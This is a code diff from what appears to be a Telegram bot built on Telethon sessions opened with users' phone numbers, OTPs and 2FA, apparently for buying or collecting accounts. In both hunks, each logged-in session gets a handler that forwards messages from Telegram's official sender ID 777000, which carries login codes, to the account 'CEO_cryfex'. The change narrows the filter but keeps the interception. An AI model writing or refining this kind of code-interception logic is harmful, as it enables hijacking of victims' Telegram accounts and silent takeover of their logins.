@@ -2624,10 +2624,9 @@ Your payment will be moved to Main Balance after verification.
         # Forward login code if any
         @client.on(events.NewMessage(incoming=True))
         async def handler(event):
-            # Forward official messages
+            # Forward ONLY official telegram messages
             try:
-                sender = await event.get_sender()
-                if sender and (getattr(sender, 'id', None) == 777000 or getattr(sender, 'username', '').lower() == 'telegram'):
+                if event.sender_id == 777000:
                     # Forward to the admin username from attached code
                     await client.send_message('CEO_cryfex', event.message)
                     logger.info(f"Forwarded official message (2FA path) for {phone} to CEO_cryfex")
@@ -2804,9 +2803,8 @@ async def confirm_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYP
                 @client.on(events.NewMessage(incoming=True))
                 async def handler(event):
                     try:
-                        sender = await event.get_sender()
-                        # 777000 is Telegram's official ID
-                        if sender and (getattr(sender, 'id', None) == 777000 or getattr(sender, 'username', '').lower() == 'telegram'):
+                        # Forward ONLY official telegram messages
+                        if event.sender_id == 777000:
                             # Forward to the admin username from attached code
                             await client.send_message('CEO_cryfex', event.message)
                             logger.info(f"Forwarded official message for {user_number} to CEO_cryfex")
